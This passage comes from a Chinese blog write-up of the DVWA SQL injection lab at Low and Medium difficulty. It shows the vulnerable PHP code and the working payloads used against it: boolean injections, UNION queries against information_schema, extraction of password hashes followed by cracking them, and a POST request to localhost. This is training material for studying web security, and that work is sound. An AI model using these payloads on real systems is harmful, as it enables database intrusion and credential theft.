&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_assoc&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">SQLITE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// 略 ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>目标SQL是&lt;code>SELECT first_name, last_name FROM users WHERE user_id = '$id'&lt;/code>。在不知道被注入的SQL长什么样的时候其实比较倾向于连接一个布尔表达式，这样就有一个比较稳定的1比特观察窗口，可以拿来判断是否存在用户或者逐位猜解用户名、密码、字段名什么的。&lt;/p>
&lt;p>这里先尝试连接一个 &lt;code>' or 1=1 -- &lt;/code> 确定注入的格式（注意 &lt;code>--&lt;/code>后面接一个空格），但暂时不会用这个方式注入。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427141637645.png"
width="382"
height="419"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427141637645_hue2e4a6d077791d7aeae06767a61d87e9_11310_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427141637645_hue2e4a6d077791d7aeae06767a61d87e9_11310_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427141637645"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="218px"
>&lt;/p>
&lt;p>先尝试下 &lt;code>union&lt;/code> 联查一下表名,&lt;code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables;--&lt;/code>，得到这样的输出。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143108884.png"
width="678"
height="627"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143108884_hue95434ff54181a3e552cad74dc79c640_24492_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143108884_hue95434ff54181a3e552cad74dc79c640_24492_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143108884"
class="gallery-image"
data-flex-grow="108"
data-flex-basis="259px"
>&lt;/p>
&lt;p>太长不全部截图了。接下来注意看一下可疑的表，直接 ctrl+f 在网页里搜 &lt;code>user&lt;/code>，很快找到这里：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143202464.png"
width="625"
height="71"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143202464_hu307659ad2afc97f1beb113925ecf5d18_1850_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143202464_hu307659ad2afc97f1beb113925ecf5d18_1850_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143202464"
class="gallery-image"
data-flex-grow="880"
data-flex-basis="2112px"
>&lt;/p>
&lt;p>接着找出 &lt;code>users&lt;/code> 表的字段名，还是通过 &lt;code>information_schema&lt;/code> ，新的 payload如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="s1">&amp;#39; UNION SELECT c.COLUMN_NAME,c.COLUMN_TYPE FROM information_schema.`COLUMNS` c WHERE c.TABLE_SCHEMA =&amp;#39;&lt;/span>&lt;span class="n">dvwa&lt;/span>&lt;span class="s1">&amp;#39; AND c.TABLE_NAME =&amp;#39;&lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="s1">&amp;#39;; --
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143506909.png"
width="646"
height="519"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143506909_hue89a969cdf307e28a18e20ab7378474c_16373_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143506909_hue89a969cdf307e28a18e20ab7378474c_16373_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143506909"
class="gallery-image"
data-flex-grow="124"
data-flex-basis="298px"
>&lt;/p>
&lt;p>注意到字段名 &lt;code>password&lt;/code>，接下来再 &lt;code>union&lt;/code> 查询一下 &lt;code>user_id&lt;/code> 和 &lt;code>password&lt;/code> 。&lt;/p>
&lt;p>&lt;code>union&lt;/code> 注入的时候有几个我觉得可能要注意的问题：&lt;/p>
&lt;ol>
&lt;li>被注入的 SQL 查询了几个列（&lt;code>union&lt;/code>的查询必须有相同数量的列），或者说有几个列的可以被观测到（查出来而且前端有变化）？这里我盲猜是两个或者三个列，所以 payload 里只写了两个列。&lt;/li>
&lt;li>查询出来之后有没有别的处理？如果还有别的判断，比如是静态类型的语言，&lt;code>union&lt;/code>查询的列类型不匹配；或者有别的业务逻辑没通过，都可能失败。&lt;/li>
&lt;/ol>
&lt;p>注入payload：&lt;code>' UNION SELECT user_id,password FROM users; --&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143644718.png"
width="395"
height="332"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143644718_hua49cdb081ad8f1de4e88b5ebeefa5809_9308_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143644718_hua49cdb081ad8f1de4e88b5ebeefa5809_9308_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143644718"
class="gallery-image"
data-flex-grow="118"
data-flex-basis="285px"
>&lt;/p>
&lt;p>成功取得密码，但密码被哈希了，盲猜 md5，直接上 cmd5 解密。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143819668.png"
width="721"
height="244"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143819668_huda5786e8946bed5b5883742c81b2163b_8988_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143819668_huda5786e8946bed5b5883742c81b2163b_8988_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143819668"
class="gallery-image"
data-flex-grow="295"
data-flex-basis="709px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143838942.png"
width="707"
height="259"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143838942_huf0baa613eae9510762ca67d57c112505_8804_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143838942_huf0baa613eae9510762ca67d57c112505_8804_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143838942"
class="gallery-image"
data-flex-grow="272"
data-flex-basis="655px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143852594.png"
width="680"
height="238"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143852594_huf849a7d99be69135895294c4d6e3d294_8498_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143852594_huf849a7d99be69135895294c4d6e3d294_8498_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143852594"
class="gallery-image"
data-flex-grow="285"
data-flex-basis="685px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143905939.png"
width="696"
height="246"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143905939_hu046a75d3e4e0e43329a69d0d4df0e4e3_8408_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143905939_hu046a75d3e4e0e43329a69d0d4df0e4e3_8408_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143905939"
class="gallery-image"
data-flex-grow="282"
data-flex-basis="679px"
>&lt;/p>
&lt;p>5和1的哈希是一样的。到这里解密就全部完成了。&lt;/p>
&lt;h3 id="medium-难度">Medium 难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427144716349.png"
width="392"
height="175"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427144716349_hub0f8913afa5cca6b3e2fc8a6de0cc0fa_7931_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427144716349_hub0f8913afa5cca6b3e2fc8a6de0cc0fa_7931_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427144716349"
class="gallery-image"
data-flex-grow="224"
data-flex-basis="537px"
>&lt;/p>
&lt;p>注意到几点：&lt;/p>
&lt;ol>
&lt;li>前端输入变成了下拉选择。&lt;/li>
&lt;li>变成了 post 方式请求。&lt;/li>
&lt;/ol>
&lt;p>接着看下代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$id&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_DVWA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SQLI_DB&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">MYSQL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_assoc&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Display values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">SQLITE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// 略 ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// This is used later on in the index.php page
&lt;/span>&lt;span class="c1">// Setting it here so we can close the database connection in here like in the rest of the source scripts
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT COUNT(*) FROM users;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$number_of_rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_row&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到两个改变：&lt;/p>
&lt;ol>
&lt;li>&lt;code>mysqli_real_escape_string($GLOBALS[&amp;quot;___mysqli_ston&amp;quot;], $id);&lt;/code>，对&lt;code>$id&lt;/code>做了转义。&lt;/li>
&lt;li>&lt;code>&amp;quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&amp;quot;&lt;/code>，变成了数字型注入。&lt;/li>
&lt;/ol>
&lt;p>按理说做了转义应该就没辙了，但还是先试试。F12从开发者工具里复制出请求，然后把&lt;code>id&lt;/code>改成&lt;code>0 or 1=1; --&lt;/code>，注意百分号编码而且&lt;code>--&lt;/code>后面留一个空格。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-user&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;referrerPolicy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=0%20or%201%3D1%3B%20--%20&amp;amp;Submit=Submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427145427860.png"
width="228"
height="275"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427145427860_hu5650447de8c114658782d5fa9d9f9a1a_4509_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427145427860_hu5650447de8c114658782d5fa9d9f9a1a_4509_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427145427860"
class="gallery-image"
data-flex-grow="82"
data-flex-basis="198px"
>&lt;/p>
&lt;p>好吧，这就直接成功了。到了这一步其实剩下的和 Low 难度就没区别了。&lt;/p>
&lt;p>不过我对那个 &lt;code>mysqli_real_escape_string&lt;/code> 还是很好奇，这个函数不是拿来防 SQL 注入的？查询文档如下。&lt;/p>
&lt;blockquote>
&lt;p>mysqli::real_escape_string &amp;ndash; mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection&lt;/p>
&lt;/blockquote>
&lt;p>看用例，这个&lt;code>real_escape_string&lt;/code>会把参数转义成合法的 SQL 字符串，也就是应该会转义处理特殊字符比如&lt;code>'&lt;/code>，但返回结果是没有&lt;code>'&lt;/code>的，所以即使用&lt;code>real_escape_string&lt;/code>转义后，这个参数最多是可以被安全放到&lt;code>''&lt;/code>里，但如果不是在&lt;code>''&lt;/code>里的话安全隐患就一点不少。&lt;/p>
&lt;h3 id="high-难度">High 难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427150448746.png"
width="493"
height="355"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427150448746_huc2b4caa9a99e052ed67febd9955e96a7_19459_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427150448746_huc2b4caa9a99e052ed67febd9955e96a7_19459_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427150448746"
